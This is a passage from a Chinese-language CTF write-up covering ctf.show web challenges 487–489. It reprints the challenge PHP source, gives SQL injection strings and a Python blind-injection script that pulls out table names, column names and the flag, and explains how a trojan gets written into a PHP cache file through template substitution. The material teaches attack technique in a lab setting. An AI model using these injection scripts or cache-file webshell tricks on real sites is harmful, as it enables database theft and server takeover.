invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>,<span class="variable">$content</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_cache</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_exists</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&#x2F;render&#x2F;file_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:56:41</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-08 21:23:28</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;On&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fileUtil</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$filename</span>,<span class="variable">$content</span>,<span class="variable">$append</span> =<span class="number">0</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$append</span>)&#123;</span><br><span class="line">			<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>,FILE_APPEND);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看了看其他的也没有可以利用的点,只有sql注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id from user where username = md5(&#x27;$username&#x27;) and password=md5(&#x27;1&#x27;) or 1=2#&#x27;) order by id limit 1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?action=check&amp;username=1&#x27;) or 0 -- + # %23&amp;password=1</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220410221106580.png" alt="image-20220410221106580"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?action=check&amp;username=1&#x27;) or 1 -- + # %23&amp;password=1</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220410221119368.png" alt="image-20220410221119368"></p>
<p>判断</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = <span class="string">&quot;http://c2367eca-9985-48ba-b0f2-b554dad1a2a2.challenge.ctf.show/index.php&quot;</span></span><br><span class="line">payload = <span class="string">&quot;length(database())=0&quot;</span> <span class="comment">#错误</span></span><br><span class="line">payload = <span class="string">&quot;length(database())&gt;0&quot;</span> <span class="comment">#正确    返回admin</span></span><br><span class="line">params = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: f<span class="string">&quot;1&#x27;) or if(&#123;payload&#125;,1,0)#&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span> : <span class="string">&#x27;check&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">r = requests.<span class="title function_ invoke__">get</span>(url,params=params)</span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c2367eca-9985-48ba-b0f2-b554dad1a2a2.challenge.ctf.show/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># 查数据库 flag</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment"># 查字段 flag</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;&quot;</span></span><br><span class="line">        <span class="comment"># 查flag</span></span><br><span class="line">        payload = <span class="string">&quot;select group_concat(flag) from flag&quot;</span></span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: f<span class="string">&quot;1&#x27;) or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)#&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span> : <span class="string">&#x27;check&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r = requests.<span class="title function_ invoke__">get</span>(url,params=params)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span>  in r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="title function_ invoke__">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web488"><a href="#web488" class="headerlink" title="web488"></a>web488</h1><p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 15:43:51</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-09 11:59:28</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/render_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/db_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$action</span>))&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">	<span class="keyword">die</span>();	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;check&#x27;</span>)&#123;</span><br><span class="line">	<span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	<span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;select id from user where username = &#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$username</span>).<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>).<span class="string">&quot;&#x27; order by id limit 1&quot;</span>;<span class="comment">#这次的sql不可用了</span></span><br><span class="line">	<span class="variable">$user</span>=db::<span class="title function_ invoke__">select_one</span>(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">		template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>,<span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$username</span>));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;error&#x27;</span>,<span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$username</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;login&#x27;</span>)&#123;</span><br><span class="line">	template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>&#x2F;render&#x2F;render_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:52:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-08 22:15:24</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;On&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;cache_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">templateUtil</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(cache::<span class="title function_ invoke__">cache_exists</span>(<span class="variable">$template</span>))&#123;</span><br><span class="line">			<span class="keyword">echo</span> cache::<span class="title function_ invoke__">get_cache</span>(<span class="variable">$template</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$templateContent</span>=file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;templates/&#x27;</span>.<span class="variable">$template</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">			<span class="variable">$cache</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">shade</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">			cache::<span class="title function_ invoke__">create_cache</span>(<span class="variable">$template</span>,<span class="variable">$cache</span>);</span><br><span class="line">			<span class="keyword">echo</span> <span class="variable">$cache</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">shade</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$value</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>&#x2F;render&#x2F;db_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:43:40</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-08 22:29:27</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;On&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">db</span></span>&#123;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">getConnection</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		 <span class="variable">$username</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">		 <span class="variable">$password</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">		 <span class="variable">$port</span>=<span class="string">&#x27;3306&#x27;</span>;</span><br><span class="line">		 <span class="variable">$addr</span>=<span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">		 <span class="variable">$database</span>=<span class="string">&#x27;ctfshow&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">mysqli</span>(<span class="variable">$addr</span>,<span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$database</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">select_one</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$conn</span> = db::<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">		<span class="variable">$result</span>=<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_object</span>();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>&#x2F;render&#x2F;cache_class</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:49:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-08 21:40:10</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;On&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cache</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">create_cache</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>))&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			file<span class="title class_">Util</span>::<span class="title function_ invoke__">write</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>,<span class="variable">$content</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_cache</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_exists</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&#x2F;render&#x2F;file_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:56:41</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-08 21:23:28</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;On&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fileUtil</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$filename</span>,<span class="variable">$content</span>,<span class="variable">$append</span> =<span class="number">0</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$append</span>)&#123;</span><br><span class="line">			<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>,FILE_APPEND);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先我们先把目录结构写好</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411102110451.png" alt="image-20220411102110451"></p>
<p>如果sql注入不可使用的话,就只有file_class.php文件的wrrite方法可以利用了,至于为什么上一关不可利用,我们等会就知道了</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411102318520.png" alt="image-20220411102318520"></p>
<p>我们发现传了两个参数进来,一个是文件名,另一个是文件内容.我们直接转到用例ctrl+b </p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411102428030.png" alt="image-20220411102428030"></p>
<p>发现只有这一处,条件是这个传入的template文件的md5(template)文件不存在,我们接着寻找谁调用了create_cache</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411102622460.png" alt="image-20220411102622460"></p>
<p>也是只有一处,传入了两个参数,一个文件名一个内容,条件是if后面的返回false</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411102822927.png" alt="image-20220411102822927"></p>
<p>也就是这里没有这个md5(template)这个文件,接着回到render_class.php文件</p>
<p>接着往上推,发现内容cache在传入之前先调用了shade方法并且传入了数组,我们先看下面的是将参数进行替换并且替换的是,接着在替换之前有一部读取文件的操作,读取的是初始文件名,不是md5的</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411103133848.png" alt="image-20220411103133848"></p>
<p>接着我们去找谁调用了render</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411103218434.png" alt="image-20220411103218434"></p>
<p>发现这里总共有四处,第一处仔细观察是无法利用的,因为只要你访问了一次index文件,就会在本地生成md5(index),之后就再也不会能写文件了,而下面两个并没有传入数组参数,这么说的话就没有办法进行替换操作,那么自然也就不能写文件进去,那么只剩下第二个文件了.如果这里能做的话,就只能说明error.php里面存在</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;username&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>我们来尝试一下,写入以下内容</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411103521026.png" alt="image-20220411103521026"></p>
<p>返回index文件进行调试,注意处理一下index文件</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411103553676.png" alt="image-20220411103553676"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411103632717.png" alt="image-20220411103632717"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411103705971.png" alt="image-20220411103705971"></p>
<p>关键步骤</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411103726475.png" alt="image-20220411103726475"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411103744290.png" alt="image-20220411103744290"></p>
<p>可见木马写入了这个md5(error)文件里面</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411103838783.png" alt="image-20220411103838783"></p>
<p>接下来我们从题目里面实现一下,照index文件填入</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411104009891.png" alt="image-20220411104009891"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411104056974.png" alt="image-20220411104056974"></p>
<p>接着访问&#x2F;cache&#x2F;cb5e100e5a9a3e7f6d1fd97512215282.php文件</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411104157508.png" alt="image-20220411104157508"></p>
<p>我们去看一下它error.php的源码,发现和我们想的一样</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411104302975.png" alt="image-20220411104302975"></p>
<p>但是不知道你有没有发现一个问题,就是如果我们第一次就直接尝试登录,一个错误的username,就会生成error的md5文件,之后就不能在向里面写文件了</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411104517364.png" alt="image-20220411104517364"></p>
<p>我们这样无论怎么发送都不能在写文件了,所以只有一次机会</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411104626210.png" alt="image-20220411104626210"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411104643730.png" alt="image-20220411104643730"></p>
<h1 id="web489"><a href="#web489" class="headerlink" title="web489"></a>web489</h1><p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 15:43:51</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-09 14:20:04</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/render_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/db_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$action</span>))&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">	<span class="keyword">die</span>();	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;check&#x27;</span>)&#123;</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;select id from user where username = &#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$username</span>).<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>).<span class="string">&quot;&#x27; order by id limit 1&quot;</span>;</span><br><span class="line">	<span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">	<span class="variable">$user</span>=db::<span class="title function_ invoke__">select_one</span>(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">		template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>,<span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$username</span>));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span 